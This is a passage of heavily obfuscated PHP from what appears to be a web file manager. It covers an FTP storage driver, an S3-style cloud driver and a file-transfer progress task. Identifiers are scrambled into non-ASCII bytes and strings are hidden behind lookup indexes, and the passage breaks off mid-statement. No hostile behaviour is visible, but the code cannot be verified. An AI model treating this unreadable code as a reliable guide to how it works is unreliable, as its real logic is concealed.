public function size($¾Û»äÀ„) { $öÕÎ’ Ñ = $this->objectMeta($¾Û»äÀ„); return $öÕÎ’ Ñ ? $öÕÎ’ Ñ[$_SERVER[ˆ¡¹µ‹Â][79]] : 0; } public function info($Şà¼ó®€) { if ($this->isFile($Şà¼ó®€)) { return $this->fileInfo($Şà¼ó®€, 0); } else { if ($this->isFolder($Şà¼ó®€)) { return $this->folderInfo($Şà¼ó®€); } } return !1; } private function fileList($È¦£›ß, &$×ÊîİçŸ, &$ÉÛòÃ‰, $™ğ—îı = false) { $Ú““ó¾Ú =& $_SERVER[ˆ¡¹µ‹Â]; $È¦£›ß = $this->iconvSystem($È¦£›ß); if (!$this->isFolder($È¦£›ß)) { return !1; } @ftp_chdir($this->connect, $Ú““ó¾Ú[8]); $È¦£›ß = rtrim($È¦£›ß, $Ú““ó¾Ú[8]) . $Ú““ó¾Ú[8]; check_abort(); $“ª‘çèŒ = @ftp_rawlist($this->connect, $È¦£›ß); if (!$“ª‘çèŒ) { $“ª‘çèŒ = array(); } $¯çÕäÓé = array($Ú““ó¾Ú[10] => 1, $Ú““ó¾Ú[1356] => 1); foreach ($“ª‘çèŒ as $¹Õ ¸òï) { $¢Áù×í¯ = $this->_listItem($¹Õ ¸òï); if ($¢Áù×í¯[0] == $Ú““ó¾Ú[825]) { continue; } $ğè¤€á˜ = $¢Áù×í¯[8]; if (empty($ğè¤€á˜) && $ğè¤€á˜ !== $Ú““ó¾Ú[228] || isset($¯çÕäÓé[$ğè¤€á˜])) { continue; } $ğè¤€á˜ = $this->iconvApp($È¦£›ß . ltrim($ğè¤€á˜, $Ú““ó¾Ú[8])); $˜Ş‹ĞÀ = array($Ú““ó¾Ú[32] => $ğè¤€á˜, $Ú““ó¾Ú[33] => $Ú““ó¾Ú[230], $Ú““ó¾Ú[79] => $¢Áù×í¯[4]); if (substr($¹Õ ¸òï, 0, 1) == $Ú““ó¾Ú[1442]) { $˜Ş‹ĞÀ[$Ú““ó¾Ú[33]] = $Ú““ó¾Ú[78]; $˜Ş‹ĞÀ[$Ú““ó¾Ú[79]] = 0; } $«ÊÅ±êå = $˜Ş‹ĞÀ[$Ú““ó¾Ú[33]] == $Ú““ó¾Ú[78] ? !0 : !1; $this->cacheMethodInfoSet($ğè¤€á˜, $«ÊÅ±êå, $˜Ş‹ĞÀ); if ($«ÊÅ±êå) { $×ÊîİçŸ[] = $ğè¤€á˜; if ($™ğ—îı) { $this->fileList($ğè¤€á˜, $×ÊîİçŸ, $ÉÛòÃ‰, $™ğ—îı); } continue; } $ÉÛòÃ‰[] = $˜Ş‹ĞÀ; } $this->cacheMethodInfoSet($È¦£›ß, !0); } private function _listItem($Ş€÷¬ÅÔ) { if (empty($Ş€÷¬ÅÔ)) { return array(); } $ÉşŒ°Œ = preg_split($_SERVER[ˆ¡¹µ‹Â][1443], $Ş€÷¬ÅÔ); if (count($ÉşŒ°Œ) <= 9) { return $ÉşŒ°Œ; } $ÉşŒ°Œ[8] = trim(substr($Ş€÷¬ÅÔ, strpos($Ş€÷¬ÅÔ, $ÉşŒ°Œ[7]) + strlen($ÉşŒ°Œ[7]))); return array_splice($ÉşŒ°Œ, 0, 9); } public function listPath($‹¸õçå, $»¯»«Î• = false) { $ïËÄ®í =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->_isconn()) { return !1; } $‹«Ëİºà = $Îœ×Ïï± = array(); $this->fileList($‹¸õçå, $‹«Ëİºà, $Îœ×Ïï±); foreach ($‹«Ëİºà as $³îœˆí¢ => $ºÏï–ªÂ) { $‹«Ëİºà[$³îœˆí¢] = $this->folderInfo($ºÏï–ªÂ, $»¯»«Î•); } foreach ($Îœ×Ïï± as $³îœˆí¢ => $ºÏï–ªÂ) { $Îœ×Ïï±[$³îœˆí¢] = $this->fileInfo($ºÏï–ªÂ[$ïËÄ®í[32]], $»¯»«Î•, $ºÏï–ªÂ); } return array($ïËÄ®í[85] => $‹«Ëİºà, $ïËÄ®í[86] => $Îœ×Ïï±); } public function has($•ç´Šó, $•æ¸¯“ = false, $Ôç±ç×Ò = true) { $Û±¢ôµ¼ =& $_SERVER[ˆ¡¹µ‹Â]; $Ñ¤·îÒ¼ = $ÁÂäèù = array(); $õßïİáÒ = $•æ¸¯“ ? !0 : !1; $this->fileList($•ç´Šó, $Ñ¤·îÒ¼, $ÁÂäèù, $õßïİáÒ); if ($•æ¸¯“) { return array($Û±¢ôµ¼[239] => count($ÁÂäèù), $Û±¢ôµ¼[240] => count($Ñ¤·îÒ¼)); } if ($Ôç±ç×Ò) { if (count($ÁÂäèù)) { return !0; } } else { if (count($Ñ¤·îÒ¼)) { return !0; } } return !1; } public function listAll($¹Ş‚¢ëñ) { $«Í¨‘äî =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->_isconn()) { return !1; } $¢—Äñ÷ú = $éû¬ÑÔş = array(); $this->fileList($¹Ş‚¢ëñ, $¢—Äñ÷ú, $éû¬ÑÔş, !0); $™§òî«€ = array_to_keyvalue($éû¬ÑÔş, $«Í¨‘äî[32]); foreach ($¢—Äñ÷ú as $úù·«Ó) { if (is_string($úù·«Ó)) { $™§òî«€[$úù·«Ó] = array($«Í¨‘äî[79] => 0); } } return $this->listAllFiles($¹Ş‚¢ëñ, $™§òî«€); } public function getContent($Ë¶€šë) { if (!$this->_isconn()) { return !1; } $Ë¶€šë = $this->iconvSystem($Ë¶€šë); return $this->fileSubstr($Ë¶€šë); } public function setContent($Ÿ…»¦èÂ, $ıöğªş  = '') { if (!$this->_isconn()) { return !1; } $¤Á·•é® = $this->pathThis($this->iconvSystem($Ÿ…»¦èÂ)); $ëåš¾ı¤ = $this->tempFile($¤Á·•é®); file_put_contents($ëåš¾ı¤, $ıöğªş ); $áşü„‡Ÿ = $this->upload($Ÿ…»¦èÂ, $this->iconvApp($ëåš¾ı¤)); $this->tempFileRemve($ëåš¾ı¤); return $áşü„‡Ÿ; } public function fileSubstr($’®¥ö­Ú, $ÃªÜ³øø = 0, $âëˆèî = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($’®¥ö­Ú, $ÃªÜ³øø, $âëˆèî); } private function ftpRequest($üÍ¡¹ëĞ, $¯®Ÿè«µ = 0, $»ôåœì½ = false) { $üÍ¡¹ëĞ = $this->iconvSystem($üÍ¡¹ëĞ); $›ô®š÷« = $this->scheme . $this->host . $_SERVER[ˆ¡¹µ‹Â][4] . $this->port; $àß šˆÃ = curl_init(); curl_setopt($àß šˆÃ, CURLOPT_URL, $›ô®š÷« . $this->pathEncode($üÍ¡¹ëĞ)); curl_setopt($àß šˆÃ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($»ôåœì½) { $Ÿ­¾×· = $¯®Ÿè«µ + $»ôåœì½ - 1; curl_setopt($àß šˆÃ, CURLOPT_RANGE, "{$¯®Ÿè«µ}\55{$Ÿ­¾×·}"); } curl_setopt($àß šˆÃ, CURLOPT_RETURNTRANSFER, 1); $ü¨ëµæç = curl_exec($àß šˆÃ); curl_close($àß šˆÃ); return $ü¨ëµæç; } public function upload($÷Ç¡ËÒ, $ôÙêùìğ, $ó„çí± = false, $¨ĞÌÍ Ç = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($÷Ç¡ËÒ))) { return !1; } $÷Ç¡ËÒ = $this->iconvSystem($÷Ç¡ËÒ); $ôÙêùìğ = $this->iconvSystem($ôÙêùìğ); $øöÓŞ¤Æ = ftp_nb_put($this->connect, $÷Ç¡ËÒ, $ôÙêùìğ, FTP_BINARY); while ($øöÓŞ¤Æ == FTP_MOREDATA) { $øöÓŞ¤Æ = ftp_nb_continue($this->connect); } if ($øöÓŞ¤Æ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } return $this->getPathOuter($÷Ç¡ËÒ); } public function download($­İ¸¬Šø, $ñäÇå•Ç = '') { if (!$this->_isconn()) { return !1; } $†…Ğ©®º = $this->pathFather($ñäÇå•Ç); if (!IO::mkdir($†…Ğ©®º)) { return !1; } $­İ¸¬Šø = $this->iconvSystem($­İ¸¬Šø); $ñäÇå•Ç = $this->iconvSystem($ñäÇå•Ç); $‚ğëıõ© = ftp_nb_get($this->connect, $ñäÇå•Ç, $­İ¸¬Šø, FTP_BINARY); while ($‚ğëıõ© == FTP_MOREDATA) { $‚ğëıõ© = ftp_nb_continue($this->connect); } if ($‚ğëıõ© != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } return $this->iconvApp($ñäÇå•Ç); } public function exist($€ˆ‚ÂÇ) { return $this->isFile($€ˆ‚ÂÇ) || $this->isFolder($€ˆ‚ÂÇ); } public function isFile($ìåù–æë) { return !$this->isFolder($ìåù–æë) && $this->objectMeta($ìåù–æë); } public function isFolder($İ¢ßî×À) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][179], $İ¢ßî×À); } protected function objectMeta($Ã¦Ÿ•ÏŠ) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][181], $Ã¦Ÿ•ÏŠ); } protected function _objectMeta($™ªğŸ÷Ò) { $Ç¿›¨ÈØ =& $_SERVER[ˆ¡¹µ‹Â]; if ($™ªğŸ÷Ò == $Ç¿›¨ÈØ[12] || $™ªğŸ÷Ò == $Ç¿›¨ÈØ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $™ªğŸ÷Ò = $this->iconvSystem($™ªğŸ÷Ò); $œõÄûâ© = array($Ç¿›¨ÈØ[32] => $this->iconvApp($™ªğŸ÷Ò), $Ç¿›¨ÈØ[33] => $Ç¿›¨ÈØ[230], $Ç¿›¨ÈØ[79] => 0); @ftp_chdir($this->connect, $Ç¿›¨ÈØ[8]); $ËÈ®ÚË = @ftp_size($this->connect, $™ªğŸ÷Ò); if ($ËÈ®ÚË != -1) { $œõÄûâ©[$Ç¿›¨ÈØ[79]] = $ËÈ®ÚË; } else { $Äış€¬ = @ftp_chdir($this->connect, $™ªğŸ÷Ò); if (!$Äış€¬) { return !1; } $œõÄûâ©[$Ç¿›¨ÈØ[33]] = $Ç¿›¨ÈØ[78]; } return $œõÄûâ©; } protected function _isFolder($´‚ú¥ìÈ) { $ÃìÔ³¢¯ =& $_SERVER[ˆ¡¹µ‹Â]; if ($´‚ú¥ìÈ == $ÃìÔ³¢¯[12] || $´‚ú¥ìÈ == $ÃìÔ³¢¯[8]) { return !0; } $Ö……Ş° = $this->_objectMeta($´‚ú¥ìÈ); return isset($Ö……Ş°[$ÃìÔ³¢¯[33]]) && $Ö……Ş°[$ÃìÔ³¢¯[33]] == $ÃìÔ³¢¯[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($åå­òÈâ) { parent::__construct($åå­òÈâ); $this->setSignVersion($_SERVER[ˆ¡¹µ‹Â][247]); } public function uploadLink($ñÅ€Ä×ï, $şÙÌŸ¥ = 0) { $Ê ‹„Æı =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->isUploadServer()) { return; } $§ÄÒ»…é = $this->getType(); if (!in_array($§ÄÒ»…é, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ğ–‡”’‰ = (!$şÙÌŸ¥ ? 1 : ceil($şÙÌŸ¥ / pow(1024, 3))) * 3600 * 4; $ê¤ŞŒã¶ = $this->multiUploadFormData($ñÅ€Ä×ï, $Ğ–‡”’‰); if ($ê¤ŞŒã¶) { $ê¤ŞŒã¶[$Ê ‹„Æı[97]] = $ñÅ€Ä×ï; $ê¤ŞŒã¶[$Ê ‹„Æı[98]] = $§ÄÒ»…é; } return $ê¤ŞŒã¶; } public function fileOutImage($Âå úÃ…, $å¯šøè¸ = 250) { if ($this->size($Âå úÃ…) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Âå úÃ…, $å¯šøè¸); } $Û¹¾Ù²² = $this->link($Âå úÃ…); $Û¹¾Ù²² .= $_SERVER[ˆ¡¹µ‹Â][1444] . $å¯šøè¸; $this->fileOutLink($Û¹¾Ù²²); } public function fileOutLink($—ìªÓ¤™) { $ÎôãâäĞ =& $_SERVER[ˆ¡¹µ‹Â]; if (substr($—ìªÓ¤™, 0, 7) == $ÎôãâäĞ[313]) { $—ìªÓ¤™ = $ÎôãâäĞ[314] . substr($—ìªÓ¤™, 7); } header($ÎôãâäĞ[175] . $—ìªÓ¤™); die; } } goto E ‡ï‹ŒÀ; E÷’„ï×éƒ: class TaskFileTransfer extends Task { protected function startAfter() { $«¢İÒ³ =& $_SERVER[ˆ¡¹µ‹Â]; $¶æ¥é– =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($«¢İÒ³[1793], array($this, $«¢İÒ³[1794])); Hook::bind($«¢İÒ³[1301], array($this, $«¢İÒ³[1795])); Hook::bind($«¢İÒ³[1796], array($this, $«¢İÒ³[1797])); Hook::bind($«¢İÒ³[668], array($this, $«¢İÒ³[1798])); Hook::bind($«¢İÒ³[669], array($this, $«¢İÒ³[1799])); Hook::bind($«¢İÒ³[675], array($this, $«¢İÒ³[1800])); Hook::bind($«¢İÒ³[676], array($this, $«¢İÒ³[1801])); Hook::bind($«¢İÒ³[671], array($this, $«¢İÒ³[1802])); Hook::bind($«¢İÒ³[673], array($this, $«¢İÒ³[1803])); Hook::bind($«¢İÒ³[637], array($this, $«¢İÒ³[1804])); Hook::bind($«¢İÒ³[634], array($this, $«¢İÒ³[1804])); Hook::bind($«¢İÒ³[639], array($this, $«¢İÒ³[1804])); Hook::bind($«¢İÒ³[641], array($this, $«¢İÒ³[1804])); Hook::bind($«¢İÒ³[643], array($this, $«¢İÒ³[1804])); Hook::bind($«¢İÒ³[1805], array($this, $«¢İÒ³[1806])); Hook::bind($«¢İÒ³[659], array($this, $«¢İÒ³[1807])); $this->sourceModelCopyFlag = !1; Hook::bind($«¢İÒ³[1808], array($this, $«¢İÒ³[1809])); Hook::bind($«¢İÒ³[1810], array($this, $«¢İÒ³[1811])); Hook::bind($«¢İÒ³[1812], array($this, $«¢İÒ³[1813])); $¶æ¥é–[$«¢İÒ³[1814]] = LNG($«¢İÒ³[1815]); $¶æ¥é–[$«¢İÒ³[1816]] = 0; $¶æ¥é–[$«¢İÒ³[1817]] = 0; $¶æ¥é–[$«¢İÒ³[1136]] = $«¢İÒ³[12]; $¶æ¥é–[$«¢İÒ³[1818]] = $«¢İÒ³[12]; $¶æ¥é–[$«¢İÒ³[1819]] = 0; $¶æ¥é–[$«¢İÒ³[1820]] = 0; $¶æ¥é–[$«¢İÒ³[1821]] = 0; if (!$¶æ¥é–[$«¢İÒ³[1652]]) { $¶æ¥é–[$«¢İÒ³[1652]] = LNG($«¢İÒ³[1822]); } } protected function endAfter() { $©¥°§±Ô =& $_SERVER[ˆ¡¹µ‹Â]; Hook::unbind($©¥°§±Ô[1793], array($this, $©¥°§±Ô[1794])); Hook::unbind($©¥°§±Ô[1301], array($this, $©¥°§±Ô[1795])); Hook::unbind($©¥°§±Ô[1796], array($this, $©¥°§±Ô[1797])); Hook::unbind($©¥°§±Ô[668], array($this, $©¥°§±Ô[1798])); Hook::unbind($©¥°§±Ô[669], array($this, $©¥°§±Ô[1799])); Hook::unbind($©¥°§±Ô[675], array($this, $©¥°§±Ô[1800])); Hook::unbind($©¥°§±Ô[676], array($this, $©¥°§±Ô[1801])); Hook::unbind($©¥°§±Ô[671], array($this, $©¥°§±Ô[1802])); Hook::unbind($©¥°§±Ô[673], array($this, $©¥°§±Ô[1803])); Hook::unbind($©¥°§±Ô[637], array($this, $©¥°§±Ô[1804])); Hook::unbind($©¥°§±Ô[634], array($this, $©¥°§±Ô[1804])); Hook::unbind($©¥°§±Ô[639], array($this, $©¥°§±Ô[1804])); Hook::unbind($©¥°§±Ô[641], array($this, $©¥°§±Ô[1804])); Hook::unbind($©¥°§±Ô[643], array($this, $©¥°§±Ô[1804])); Hook::unbind($©¥°§±Ô[1805], array($this, $©¥°§±Ô[1806])); Hook::unbind($©¥°§±Ô[659], array($this, $©¥°§±Ô[1807])); Hook::unbind($©¥°§±Ô[1808], array($this, $©¥°§±Ô[1809])); Hook::unbind($©¥°§±Ô[1810], array($this, $©¥°§±Ô[1811])); Hook::unbind($©¥°§±Ô[1812], array($this, $©¥°§±Ô[1813])); } public function copyMoveStart($ƒŞŒ‡Íä, $ËºÅ¶êâ, $‚¨ÉÄê, $¡¨ê³úË) { $ÓÉ³ =& $_SERVER[ˆ¡¹µ‹Â]; self::log($ÓÉ³[1823] . $ËºÅ¶êâ . $ÓÉ³[73] . $¡¨ê³úË); $ïóøş¦™ = rtrim(TEMP_FILES, $ÓÉ³[8]); if (substr($ËºÅ¶êâ, 0, strlen($ïóøş¦™)) == $ïóøş¦™) { return; } if (substr($¡¨ê³úË, 0, strlen($ïóøş¦™)) == $ïóøş¦™) { return; } $‚¥­ø¿€ =& $this->task; $‚¥­ø¿€[$ÓÉ³[1824]] = KodIO::transferType($ƒŞŒ‡Íä, $‚¨ÉÄê); $this->update(); } public function updateAfter() { $Ë¶ßñ°Ç =& $_SERVER[ˆ¡¹µ‹Â]; $İÇÌú° =& $this->task; if (!$İÇÌú°[$Ë¶ßñ°Ç[830]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($İÇÌú°[$Ë¶ßñ°Ç[1824]] == $Ë¶ßñ°Ç[1394]) { return; } self::updateTask($İÇÌú°); } private static function updateTask(&$Šığ£ñ) { $Óï‡¸÷ =& $_SERVER[ˆ¡¹µ‹Â]; if ($Šığ£ñ[$Óï‡¸÷[1824]] == $Óï‡¸÷[1272] || $Šığ£ñ[$Óï‡¸÷[1824]] == $Óï‡¸÷[110]) { if ($Šığ£ñ[$Óï‡¸÷[1818]]) { $Šığ£ñ[$Óï‡¸÷[1821]] = $Šığ£ñ[$Óï‡¸÷[1820]] + $Šığ£ñ[$Óï‡¸÷[1817]]; } } else { if ($Šığ£ñ[$Óï‡¸÷[1824]] == $Óï‡¸÷[1395]) { if ($Šığ£ñ[$Óï‡¸÷[1818]] == $Óï‡¸÷[1272]) { $Šığ£ñ[$Óï‡¸÷[1821]] = $Šığ£ñ[$Óï‡¸÷[1820]] + $Šığ£ñ[$Óï‡¸÷[1817]] * 0.5; } else { if ($Šığ£ñ[$Óï‡¸÷[1818]] == $Óï‡¸÷[110]) { $Šığ£ñ[$Óï‡¸÷[1821]] = $Šığ£ñ[$Óï‡¸÷[1820]] + $Šığ£ñ[$Óï‡¸÷[1816]] * 0.5 + $Šığ£ñ[$Óï‡¸÷[1817]] * 0.5; } } } } $Šığ£ñ[$Óï‡¸÷[1765]] = $Šığ£ñ[$Óï‡¸÷[1821]] / $Šığ£ñ[$Óï‡¸÷[830]]; if ($Šığ£ñ[$Óï‡¸÷[1765]] > 0) { $æ‡”…ªì = timeFloat() - $Šığ£ñ[$Óï‡¸÷[1767]] - $Šığ£ñ[$Óï‡¸÷[1770]]; $Šığ£ñ[$Óï‡¸÷[1771]] = $æ‡”…ªì * (1 - $Šığ£ñ[$Óï‡¸÷[1765]]) / $Šığ£ñ[$Óï‡¸÷[1765]]; } } public function addPath($Ùëè¿îÅ) { $óşæ»¨¦ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Ùëè¿îÅ) { return; } $Äñ‘àï‚ =& $this->task; $å»ó’„¯ = IO::infoWithChildren($Ùëè¿îÅ); $Œ“ø¿ = $Äñ‘àï‚[$óşæ»¨¦[1825]] ? $Äñ‘àï‚[$óşæ»¨¦[1825]][$óşæ»¨¦[1826]] : 0; $Äñ‘àï‚[$óşæ»¨¦[1825]] = array($óşæ»¨¦[1826] => $Œ“ø¿ + 1, $óşæ»¨¦[494] => $å»ó’„¯[$óşæ»¨¦[32]], $óşæ»¨¦[87] => $å»ó’„¯[$óşæ»¨¦[87]], $óşæ»¨¦[582] => $å»ó’„¯[$óşæ»¨¦[582]] ? $å»ó’„¯[$óşæ»¨¦[582]] : $å»ó’„¯[$óşæ»¨¦[87]]); if ($å»ó’„¯[$óşæ»¨¦[33]] == $óşæ»¨¦[230]) { $Äñ‘àï‚[$óşæ»¨¦[1134]] += 1; } else { $Äñ‘àï‚[$óşæ»¨¦[1134]] += $å»ó’„¯[$óşæ»¨¦[82]][$óşæ»¨¦[80]]; if ($å»ó’„¯[$óşæ»¨¦[193]]) { $Äñ‘àï‚[$óşæ»¨¦[1134]] += $å»ó’„¯[$óşæ»¨¦[82]][$óşæ»¨¦[81]] + 1; } } $Äñ‘àï‚[$óşæ»¨¦[830]] += $å»ó’„¯[$óşæ»¨¦[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($š¨•Ä¢Ä) { } public function sourceAddHashEnd($¤Ç¦Ö¦ø) { } public function sourceAddFileStart($æˆÕªÜ) { $­ãÊø”¶ =& $_SERVER[ˆ¡¹µ‹Â]; $²Á¡Ö•‚ =& $this->task; $²Á¡Ö•‚[$­ãÊø”¶[1816]] = $æˆÕªÜ[$­ãÊø”¶[79]]; $²Á¡Ö•‚[$­ãÊø”¶[1814]] = $æˆÕªÜ[$­ãÊø”¶[32]]; $²Á¡Ö•‚[$­ãÊø”¶[1136]] = $æˆÕªÜ[$­ãÊø”¶[32]]; $²Á¡Ö•‚[$­ãÊø”¶[1827]] = $æˆÕªÜ[$­ãÊø”¶[87]]; $this->update(); } public function sourceAddFileEnd($˜±Ç›‹) { $ğ…Ää‰Å =& $_SERVER[ˆ¡¹µ‹Â]; $¤…Ò½‹‡ =& $this->task; $¤…Ò½‹‡[$ğ…Ää‰Å[1821]] += $˜±Ç›‹[$ğ…Ää‰Å[79]]; $¤…Ò½‹‡[$ğ…Ää‰Å[1827]] = $˜±Ç›‹[$ğ…Ää‰Å[87]]; $this->update(1); } public function copyFileStart($˜®Òæ‡, $´Êàª¾, $ÔÕ·Ú‡¸, $ùÊ¬ş«, $Œ¿òËè˜, $ü‘¦å«) { $çÌÍ‹¡ì =& $_SERVER[ˆ¡¹µ‹Â]; $â”ÕàÉ = $Œ¿òËè˜; if ($â”ÕàÉ == $GLOBALS[$çÌÍ‹¡ì[1828]]) { $â”ÕàÉ = $GLOBALS[$çÌÍ‹¡ì[1829]]; } $GLOBALS[$çÌÍ‹¡ì[1829]] = $Œ¿òËè˜; $GLOBALS[$çÌÍ‹¡ì[1828]] = $ü‘¦å«; $ıÑ­÷» =& $this->task; $ıÑ­÷»[$çÌÍ‹¡ì[1814]] = $â”ÕàÉ; $ıÑ­÷»[$çÌÍ‹¡ì[1816]] = (int) $˜®Òæ‡->size($´Êàª¾); $ıÑ­÷»[$çÌÍ‹¡ì[1817]] = 0; $ıÑ­÷»[$çÌÍ‹¡ì[1136]] = $çÌÍ‹¡ì[12]; $ıÑ­÷»[$çÌÍ‹¡ì[1818]] = $çÌÍ‹¡ì[12]; $ıÑ­÷»[$çÌÍ‹¡ì[1819]] = 0; $ÓÌÒÁûó = $ıÑ­÷»[$çÌÍ‹¡ì[1816]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ıÑ­÷»[$çÌÍ‹¡ì[475]] . $çÌÍ‹¡ì[1830]); if ($ÓÌÒÁûó && file_exists(get_path_father($ùÊ¬ş«))) { Cache::set($ıÑ­÷»[$çÌÍ‹¡ì[475]] . $çÌÍ‹¡ì[1830], $ùÊ¬ş«); $ıÑ­÷»[$çÌÍ‹¡ì[1787]] = array($çÌÍ‹¡ì[1831], $çÌÍ‹¡ì[1832]); } $this->update(0, $ÓÌÒÁûó); } public static function updateCopyLocalFileSize($çÁÕ¥ß½) { $»å¥ª£é =& $_SERVER[ˆ¡¹µ‹Â]; $ÁÕÄè°¾ = Cache::get($çÁÕ¥ß½[$»å¥ª£é[475]] . $»å¥ª£é[1830]); if (!$ÁÕÄè°¾ || !file_exists($ÁÕÄè°¾)) { return $çÁÕ¥ß½; } $çÁÕ¥ß½[$»å¥ª£é[1817]] = @filesize($ÁÕÄè°¾); $çÁÕ¥ß½[$»å¥ª£é[1821]] += $çÁÕ¥ß½[$»å¥ª£é[1817]]; self::updateTask($çÁÕ¥ß½); return $çÁÕ¥ß½; } public function copyFileEnd($Ø ©´¼, $ùÁÎõ”á, $ºîÕ³Ø», $‰÷óôÆÑ, $ñÈ‹™ôÂ, $†–ïÎ­™) { $Êâ¨®ß¸ =& $_SERVER[ˆ¡¹µ‹Â]; $Ôı»Œ =& $this->task; $Ôı»Œ[$Êâ¨®ß¸[1817]] = $Ôı»Œ[$Êâ¨®ß¸[1816]]; $Ôı»Œ[$Êâ¨®ß¸[1818]] = $Êâ¨®ß¸[12]; unset($Ôı»Œ[$Êâ¨®ß¸[1787]]); if ($ñÈ‹™ôÂ == $Ôı»Œ[$Êâ¨®ß¸[1814]]) { $Ôı»Œ[$Êâ¨®ß¸[1820]] += $Ôı»Œ[$Êâ¨®ß¸[1816]]; $Ôı»Œ[$Êâ¨®ß¸[1821]] = $Ôı»Œ[$Êâ¨®ß¸[1820]]; $—Ó¼ÒĞì = 1; if (isset($Ôı»Œ[$Êâ¨®ß¸[1827]]) && $Ôı»Œ[$Êâ¨®ß¸[1827]] == $ùÁÎõ”á) { $—Ó¼ÒĞì = 0; } $this->update($—Ó¼ÒĞì); } else { $this->update(); $Ôı»Œ[$Êâ¨®ß¸[1817]] = 0; } Cache::remove($Ôı»Œ[$Êâ¨®ß¸[475]] . $Êâ¨®ß¸[1830]); self::log($Êâ¨®ß¸[1833] . $ùÁÎõ”á . $Êâ¨®ß¸[73] . $‰÷óôÆÑ . $Êâ¨®ß¸[262] . $ñÈ‹™ôÂ . $Êâ¨®ß¸[1834] . $Ôı»Œ[$Êâ¨®ß¸[1814]]); } public function updateFileEnd($ö”åãÂÇ, $¨ÎÄ›´ë) { $Â¡¦†”ù =& $_SERVER[ˆ¡¹µ‹Â]; $ÉÑ¿‹é =& $this->task; $ÉÑ¿‹é[$Â¡¦†”ù[1814]] = $ö”åãÂÇ; $ÉÑ¿‹é[$Â¡¦†”ù[1816]] = $¨ÎÄ›´ë; $ÉÑ¿‹é[$Â¡¦†”ù[1820]] += $¨ÎÄ›´ë; $ÉÑ¿‹é[$Â¡¦†”ù[1821]] = $ÉÑ¿‹é[$Â¡¦†”ù[1820]]; $this->update(1); self::log($Â¡¦†”ù[1835] . $ö”åãÂÇ); } public function sourceModelCopy($•¯ø€€¯) { $®·Ö‘øÛ =& $_SERVER[ˆ¡¹µ‹Â]; $–Øî•¥Ó = $•¯ø€€¯[0]; $èï‡ôˆ½ = $•¯ø€€¯[1]; $„˜÷Ğˆ¨ =& $this->task; $this->sourceModelCopyFlag = !0; $·òôÕÍ„ = 0; switch ($–Øî•¥Ó) { case $®·Ö‘øÛ[635]: $·òôÕÍ„ = 1; break; case $®·Ö‘øÛ[638]: $„˜÷Ğˆ¨[$®·Ö‘øÛ[1814]] = $èï‡ôˆ½[$®·Ö‘øÛ[32]]; break; case $®·Ö‘øÛ[640]: $·òôÕÍ„ = intval($•¯ø€€¯[$®·Ö‘øÛ[456]] * 0.4); break; case $®·Ö‘øÛ[642]: $·òôÕÍ„ = intval($•¯ø€€¯[$®·Ö‘øÛ[456]] * 0.2); break; case $®·Ö‘øÛ[644]: $·òôÕÍ„ = intval($•¯ø€€¯[$®·Ö‘øÛ[456]] * 0.4); break; } $this->update($·òôÕÍ„); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¨ÀÌõö, $ä§‡Ğ­û) { $ÅŠü—´ø =& $_SERVER[ˆ¡¹µ‹Â]; $this->sourceModelCopyFlag = !0; $œ´°‚”¯ = 1; if (isset($¨ÀÌõö[$ÅŠü—´ø[82]])) { $œ´°‚”¯ = $¨ÀÌõö[$ÅŠü—´ø[82]][$ÅŠü—´ø[80]]; $œ´°‚”¯ = $œ´°‚”¯ + $¨ÀÌõö[$ÅŠü—´ø[82]][$ÅŠü—´ø[81]] + 1; } $this->update($œ´°‚”¯); $this->sourceModelCopyFlag = !1; } public function sourceMove($Å¢¤¬ÖÁ) { $this->sourceRemove($Å¢¤¬ÖÁ, !1); } public function curlProgress($óŠäíşü, $èÑŒÓ†¬, $üâ´Ô±, $õáüĞï, $É‹ùâØı) { $…˜†²Ï® =& $_SERVER[ˆ¡¹µ‹Â]; $Î‹‘’Åü =& $this->task; if ($É‹ùâØı > 0) { $Î‹‘’Åü[$…˜†²Ï®[1136]] = $…˜†²Ï®[1836]; $Î‹‘’Åü[$…˜†²Ï®[1818]] = $…˜†²Ï®[110]; if ($Î‹‘’Åü[$…˜†²Ï®[1816]]) { $Î‹‘’Åü[$…˜†²Ï®[1817]] = $É‹ùâØı; } if ($Î‹‘’Åü[$…˜†²Ï®[1819]]) { $Î‹‘’Åü[$…˜†²Ï®[1817]] = $É‹ùâØı + $Î‹‘’Åü[$…˜†²Ï®[1819]]; } } else { if ($üâ´Ô± > 0) { if ($Î‹‘’Åü[$…˜†²Ï®[1816]] == $èÑŒÓ†¬) { $Î‹‘’Åü[$…˜†²Ï®[1817]] = $üâ´Ô±; $Î‹‘’Åü[$…˜†²Ï®[1136]] = $…˜†²Ï®[1837]; $Î‹‘’Åü[$…˜†²Ï®[1818]] = $…˜†²Ï®[1272]; } } } $this->update(); } public function curlProgressStart($¯Ä™ûš¤) { } public function curlProgressEnd($õİÎşúÏ) { $ùóËı˜ü =& $_SERVER[ˆ¡¹µ‹Â]; $É†¿ĞÚÍ =& $this->task; $¶ê­–¬¤ = curl_getinfo($õİÎşúÏ); $á´Š§ÕÄ = $¶ê­–¬¤[$ùóËı˜ü[1838]]; if ($á´Š§ÕÄ == -1) { $á´Š§ÕÄ = 